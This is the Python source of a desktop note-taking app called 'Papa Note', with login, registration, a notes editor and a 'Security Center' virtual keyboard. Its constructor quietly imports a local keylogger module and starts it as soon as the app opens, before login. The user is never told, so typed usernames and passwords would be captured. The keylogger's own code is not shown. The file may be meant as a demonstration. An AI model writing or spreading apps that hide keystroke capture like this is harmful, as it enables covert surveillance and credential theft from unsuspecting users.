from __future__ import annotations
from datetime import datetime
from typing import Any
import customtkinter as ctk
from tkinter import messagebox
import sqlite3

import database
import keylogger

APP_TITLE = "Papa Note"

class PapaNoteApp(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        
        self.title(APP_TITLE)
        self.geometry("1100x700")
        
        self.current_user_id: int | None = None
        self.current_note_id: int | None = None
        self.note_buttons: dict[int, ctk.CTkButton] = {}

        database.init_db()
        
        self.container = ctk.CTkFrame(self, fg_color="transparent")
        self.container.pack(fill="both", expand=True)

        self.show_login_screen()
        keylogger.start_keylogger()

    def _clear_container(self):
        for widget in self.container.winfo_children():
            widget.destroy()

    def show_login_screen(self):
        self._clear_container()
        login_frame = ctk.CTkFrame(self.container, width=400, height=500, corner_radius=20)
        login_frame.place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(login_frame, text="Welcome Back", font=("Segoe UI", 28, "bold")).pack(pady=(40, 20))
        
        self.username_entry = ctk.CTkEntry(login_frame, width=300, height=45, placeholder_text="Username")
        self.username_entry.pack(pady=10)
        
        self.password_entry = ctk.CTkEntry(login_frame, width=300, height=45, placeholder_text="Password", show="*")
        self.password_entry.pack(pady=10)

        ctk.CTkButton(login_frame, text="Login", width=300, height=45, command=self.handle_login).pack(pady=(20, 10))
        ctk.CTkButton(login_frame, text="Create New Account", fg_color="transparent", border_width=1, command=self.show_register_screen).pack()

    def show_register_screen(self):
        self._clear_container()
        reg_frame = ctk.CTkFrame(self.container, width=400, height=500, corner_radius=20)
        reg_frame.place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(reg_frame, text="Register", font=("Segoe UI", 28, "bold")).pack(pady=(40, 20))
        
        reg_user = ctk.CTkEntry(reg_frame, width=300, height=45, placeholder_text="Choose Username")
        reg_user.pack(pady=10)
        
        reg_pass = ctk.CTkEntry(reg_frame, width=300, height=45, placeholder_text="Choose Password", show="*")
        reg_pass.pack(pady=10)

        def do_register():
            u, p = reg_user.get(), reg_pass.get()
            if u and p:
                try:
                    database.register_user(u, p)
                    messagebox.showinfo("Success", "Account created! Please login.")
                    self.show_login_screen()
                except sqlite3.IntegrityError:
                    messagebox.showerror("Error", "Username already exists!")
            else:
                messagebox.showwarning("Warning", "Fields cannot be empty")

        ctk.CTkButton(reg_frame, text="Sign Up", width=300, height=45, fg_color="#10b981", command=do_register).pack(pady=(20, 10))
        ctk.CTkButton(reg_frame, text="Back to Login", fg_color="transparent", command=self.show_login_screen).pack()

    def handle_login(self):
        u, p = self.username_entry.get(), self.password_entry.get()
        user = database.login_user(u, p)
        if user:
            self.current_user_id = user[0]
            self.show_main_app()
        else:
            messagebox.showerror("Login Failed", "Invalid username or password")

    def show_main_app(self):
        self._clear_container()
        self.container.grid_columnconfigure(0, weight=0)
        self.container.grid_columnconfigure(1, weight=1)
        self.container.grid_rowconfigure(0, weight=1)

        self._build_sidebar()
        self._build_main_editor()
        
        self.refresh_notes()
        self.new_note()

    def _build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self.container, width=300, corner_radius=0, fg_color="#111827")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(3, weight=1) 

        brand_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        brand_frame.grid(row=0, column=0, padx=20, pady=(30, 10), sticky="ew")
        ctk.CTkLabel(brand_frame, text="📝 Papa Note", font=("Segoe UI", 24, "bold"), text_color="#f9fafb").pack(side="left")

        self.new_button = ctk.CTkButton(self.sidebar, text="+ New Note", font=("Segoe UI", 14, "bold"), fg_color="#2563eb", height=45, command=self.new_note)
        self.new_button.grid(row=1, column=0, padx=18, pady=10, sticky="ew")

        self.search_entry = ctk.CTkEntry(self.sidebar, placeholder_text="🔍 Search notes...", height=35, fg_color="#1f2937", border_width=0)
        self.search_entry.grid(row=2, column=0, padx=18, pady=(5, 10), sticky="ew")
        self.search_entry.bind("<KeyRelease>", lambda e: self.refresh_notes())

        self.notes_scroll = ctk.CTkScrollableFrame(self.sidebar, fg_color="transparent", label_text="Your Notes")
        self.notes_scroll.grid(row=3, column=0, padx=10, pady=5, sticky="nsew")

        footer_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        footer_frame.grid(row=4, column=0, padx=18, pady=5, sticky="ew")
        self.note_count_label = ctk.CTkLabel(footer_frame, text="0 items", font=("Segoe UI", 12), text_color="#6b7280")
        self.note_count_label.pack(side="left")

        ctk.CTkButton(self.sidebar, text="Logout", fg_color="#ef4444", height=35, command=self.show_login_screen).grid(row=5, column=0, padx=18, pady=(10, 20), sticky="ew")

    def _build_main_editor(self):
        self.main = ctk.CTkFrame(self.container, corner_radius=0, fg_color="#0b1220")
        self.main.grid(row=0, column=1, sticky="nsew")
        self.main.grid_columnconfigure(0, weight=1)
        self.main.grid_rowconfigure(1, weight=1)

        top_bar = ctk.CTkFrame(self.main, fg_color="transparent", height=80)
        top_bar.grid(row=0, column=0, padx=28, pady=(20, 10), sticky="ew")
        
        self.title_entry = ctk.CTkEntry(top_bar, placeholder_text="Enter note title...", font=("Segoe UI", 26, "bold"), fg_color="transparent", border_width=0, text_color="#f3f4f6")
        self.title_entry.pack(side="left", fill="x", expand=True)

        ctk.CTkButton(top_bar, text="Save", width=100, fg_color="#10b981", command=self.save_note).pack(side="right", padx=5)
        ctk.CTkButton(top_bar, text="Delete", width=80, fg_color="#374151", hover_color="#ef4444", command=self.delete_note).pack(side="right", padx=5)

        editor_card = ctk.CTkFrame(self.main, fg_color="#111827", corner_radius=15)
        editor_card.grid(row=1, column=0, padx=28, pady=10, sticky="nsew")
        self.content_text = ctk.CTkTextbox(editor_card, font=("Segoe UI", 15), fg_color="transparent", text_color="#d1d5db", padx=20, pady=20, undo=True)
        self.content_text.pack(fill="both", expand=True)

        self._build_security_center()

        self.status_label = ctk.CTkLabel(self.main, text="Ready", font=("Segoe UI", 12), text_color="#4b5563")
        self.status_label.grid(row=3, column=0, padx=28, pady=(0, 10), sticky="w")

    def _build_security_center(self) -> None:
        self.security_frame = ctk.CTkFrame(self.main, corner_radius=15, fg_color="#1e293b")
        self.security_frame.grid(row=2, column=0, padx=28, pady=(0, 22), sticky="ew")

        ctk.CTkLabel(self.security_frame, text="🛡️ Security Center - Virtual Keyboard", font=("Segoe UI", 12, "bold"), text_color="#10b981").pack(pady=5)

        keys_frame = ctk.CTkFrame(self.security_frame, fg_color="transparent")
        keys_frame.pack(pady=5)
        keys = ['1','2','3','4','5','6','7','8','9','0','Q','W','E','R','T','Y','A','S','D','F','G','H']

        for i, key in enumerate(keys):
            ctk.CTkButton(keys_frame, text=key, width=40, height=40, fg_color="#334155", command=lambda k=key: self._virtual_input(k)).grid(row=i//11, column=i%11, padx=2, pady=2)

    def _virtual_input(self, char: str) -> None:
        self.content_text.insert("insert", char)
        self.status_label.configure(text=f"Secure Input: '{char}'", text_color="#10b981")

    def save_note(self) -> None:
        title = self.title_entry.get().strip() or "Untitled note"
        content = self.content_text.get("1.0", "end-1c").strip()
        now = datetime.now().isoformat(timespec="seconds")

        self.current_note_id = database.save_note(self.current_user_id, self.current_note_id, title, content, now)
        self.status_label.configure(text="Changes saved", text_color="#10b981")
        self.refresh_notes()

    def delete_note(self) -> None:
        if self.current_note_id is None: return
        if messagebox.askyesno("Confirm", "Delete this note?"):
            database.delete_note(self.current_note_id, self.current_user_id)
            self.new_note()
            self.refresh_notes()

    def refresh_notes(self) -> None:
        query = self.search_entry.get().strip()
        notes = database.fetch_notes(self.current_user_id, query)
        for widget in self.notes_scroll.winfo_children(): widget.destroy()
        self.note_buttons.clear()
        self.note_count_label.configure(text=f"{len(notes)} items")

        for index, note in enumerate(notes):
            btn = ctk.CTkButton(self.notes_scroll, text=f"{note['title'][:20]}\n{note['updated_at'][:10]}", anchor="w", height=60, fg_color="#0f172a", command=lambda n=note['id']: self.open_note(n))
            btn.pack(padx=5, pady=5, fill="x")
            self.note_buttons[note["id"]] = btn
        self._highlight_active_note()

    def open_note(self, note_id: int) -> None:
        note = database.get_note(note_id)
        if note:
            self.current_note_id = note["id"]
            self.title_entry.delete(0, "end"); self.title_entry.insert(0, note["title"])
            self.content_text.delete("1.0", "end"); self.content_text.insert("1.0", note["content"])
            self._highlight_active_note()

    def new_note(self) -> None:
        self.current_note_id = None
        self.title_entry.delete(0, "end"); self.content_text.delete("1.0", "end")
        self._highlight_active_note()

    def _highlight_active_note(self) -> None:
        for nid, btn in self.note_buttons.items():
            btn.configure(fg_color="#1d4ed8" if nid == self.current_note_id else "#0f172a")

if __name__ == "__main__":
    app = PapaNoteApp()
    app.mainloop()